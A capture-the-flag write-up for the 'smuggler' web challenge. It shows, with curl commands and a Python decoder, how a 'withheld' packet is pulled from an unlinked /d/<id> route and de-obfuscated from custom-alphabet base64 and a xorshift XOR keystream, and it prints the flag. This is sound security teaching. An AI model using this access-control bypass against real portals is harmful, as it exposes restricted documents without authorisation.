# smuggler

> Web · Easy · Iulian Schifirnet  
> Points: 120 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{6vUYPNxBJKKIKIM9DDSsEYly}`

The challenge ran on a per-team container instance, and each instance handed out its own flag value, so yours would differ from the one above. The instances are no longer up; `<instance>` below stands for the address the challenge page gave you.

**Challenge**

Meridian Reporting is the internal portal of the Meridian Continuity Directorate, a coalition partner in the Operation Dawn theatre. Desks file their returns here; most are listed for download, but one controlled packet is "withheld from the dashboard and released only to a named distribution list." Recover that packet. You start your own instance and work only against the address it gives you.

**Approach / walkthrough**

*Tools:* `curl` to talk to the instance and save its pages, a short standard-library Python decoder that reimplements the site's exporter, and `unzip` to unpack the recovered packet. Save every page to a file — the last step decodes a saved page.

*1. Read the register.* The dashboard is the whole attack surface:

```sh
curl -s http://<instance>/ -o dashboard.html
```

The visible table (`<tbody id="rows">`) is empty scaffolding, filled client-side — so the data ships with the page, as one inline script. List it:

```sh
grep -o 'window.__CATALOG__ = .*' dashboard.html | tr ',' '\n' | grep -E '"id"|"title"|"access"'
```

It holds sixteen returns, fifteen `"public"`. The odd one out is exactly the packet the brief is about — "Operation Dawn corridor logistics packet", `access: "controlled"` — and the page hands you its id: `8fb4ee23ffd13ce0`.

*2. Test the "withheld" claim.* The dashboard script is the entire access model:

```sh
curl -s http://<instance>/static/js/dashboard.js
```

```js
if (pub) {
  var a = el("a", "linkact", "Open");
  a.href = "/d/" + r.id;
  act.appendChild(a);
} else {
  act.appendChild(el("span", "muteact", "Withheld"));
}
```

A public row gets a link to `/d/<id>`; a controlled row gets the word "Withheld" instead of a link. Nothing stops you typing the URL yourself. The `/about` page even tells the portal's own story: exports are "assembled on your workstation at download, so a return's contents are not carried in the page," and controlled items "are released individually to a named distribution list." Fetch a public return first to learn what an export page looks like:

```sh
curl -s http://<instance>/d/corridor-status-wk41 -o pub-wk41.html
```

Now the same route with the withheld id — no login, no desk, no distribution list:

```sh
curl -s http://<instance>/d/8fb4ee23ffd13ce0 -o ctl-packet.html
```

You get the identical export page, badge changed to "Controlled", and it ends with the payload the download button would have assembled plus the scripts that assemble it:

```html
<script nonce="...">window.__EXPORT__ = {"parts": ["n4aiaEmOfViI9xuAiYcHPCUx6QdMClv7Yh7ey+xHI8NlvRpW", ...],
 "seed": 523124044,
 "alphabet": "qQWeErRtTyYuUiIoOpPaAsSdDfFgGhHjJkKlLzZxXcCvVbBnNmM0123456789-+/",
 "filename": "corridor-logistics-packet.zip", "mime": "application/zip"};</script>
<script src="/assets/exporter.js"></script>
```

So the "file is not carried in this page" note is true only in the narrowest sense: the whole packet travels with the page, encoded.

*3. Read the export recipe.* `report.js` only calls `Meridian.save(window.__EXPORT__)`; the recipe is in the exporter:

```sh
curl -s http://<instance>/assets/exporter.js
```

```js
var STD = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
function stream(seed){               // xorshift32, shifts 13/17/5
  var x = seed >>> 0;
  return function(){ x^=x<<13; x>>>=0; x^=x>>>17; x>>>=0; x^=x<<5; x>>>=0; return x & 0xff; };
}
function build(cfg){
  var packed = cfg.parts.join(""), alpha = cfg.alphabet, s = "";
  for (var i=0;i<packed.length;i++){ var ch=packed[i];
    if (ch==="="){ s+="="; continue; } s += STD[alpha.indexOf(ch)]; }
  var raw = atob(s), next = stream(cfg.seed), out = new Uint8Array(raw.length);
  for (var j=0;j<raw.length;j++) out[j] = (raw.charCodeAt(j) ^ next()) & 0xff;
  return out;
}
```

Two transformations: the joined `parts` are base64 written in `cfg.alphabet`, so each character is mapped to the standard base64 character at the same index, then `atob`-decoded; then every byte is XORed with the low byte of a xorshift32 generator (shifts 13/17/5) seeded with `cfg.seed`. Everything the decoder needs — parts, alphabet, seed, filename — is already in the saved page, so the rest is offline.

*4. Decode the packet.* Port the exporter to Python:

```python
import base64, json, re, sys
STD = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

def keystream(seed):
    x = seed & 0xFFFFFFFF
    while True:
        x ^= (x << 13) & 0xFFFFFFFF
        x ^= x >> 17
        x ^= (x << 5) & 0xFFFFFFFF
        yield x & 0xFF

def build(cfg):
    packed = "".join(cfg["parts"]); alpha = cfg["alphabet"]
    s = "".join("=" if ch == "=" else STD[alpha.index(ch)] for ch in packed)
    raw = base64.b64decode(s); ks = keystream(cfg["seed"])
    return bytes(b ^ next(ks) for b in raw)

html = open(sys.argv[1]).read()
cfg = json.loads(re.search(r"__EXPORT__ = (\{.*?\});?</script>", html, re.S).group(1))
open(cfg["filename"], "wb").write(build(cfg))
```

```sh
python3 decode_export.py ctl-packet.html
unzip -o corridor-logistics-packet.zip -d packet
```

```
wrote corridor-logistics-packet.zip (954 bytes, application/zip)
  inflating: packet/00-cover-note.txt
  inflating: packet/01-distribution.txt
  inflating: packet/02-release-authorization.txt
```

The packet holds a cover note, the distribution list it was never supposed to leave, and the release authorization:

```sh
cat packet/02-release-authorization.txt
```

```
  Authorization code: CSCTF{6vUYPNxBJKKIKIM9DDSsEYly}
```

That line is the flag.

**Why it works**

Meridian's idea of access control is one branch in the dashboard script: public rows get a link to `/d/<id>`, controlled rows get the word "Withheld", and the server never checks which is which. The full register — including the withheld packet's id — has to ship to the browser in `window.__CATALOG__` so the dashboard can render client-side, which turns "withheld" into merely "unlinked." The `/d/<id>` handler is one generic route that serves the same export page for any catalogue id and never checks the requester against a distribution list, so naming the hidden id is the whole bypass. On top of that, the "not carried in the page" claim is obfuscation, not protection: the encoded packet and the full decoding recipe (custom-alphabet base64 plus a seeded xorshift32 keystream) are both sent to every visitor as `window.__EXPORT__` and `/assets/exporter.js`, so once you have the page you already have the file.

**Validation / reproduction**

The Python decoder produced a 954-byte file that `unzip` extracted cleanly into a valid ZIP, which confirms the alphabet mapping and keystream were reproduced exactly — a wrong alphabet or seed would yield garbage bytes, not a parseable archive. The release-authorization file held a `CSCTF{...}` value; .dev's submission log shows it accepted on the first submission, eight minutes into Wave 2. To reproduce: pull the dashboard, grep `window.__CATALOG__` for the controlled id, fetch `/d/<controlled-id>` directly, then run the decoder on the saved page. Gotcha: keep the `=` padding passthrough and index into `cfg.alphabet` (not standard base64) — the alphabet is a scrambled permutation, so decoding against STD order silently corrupts the output.
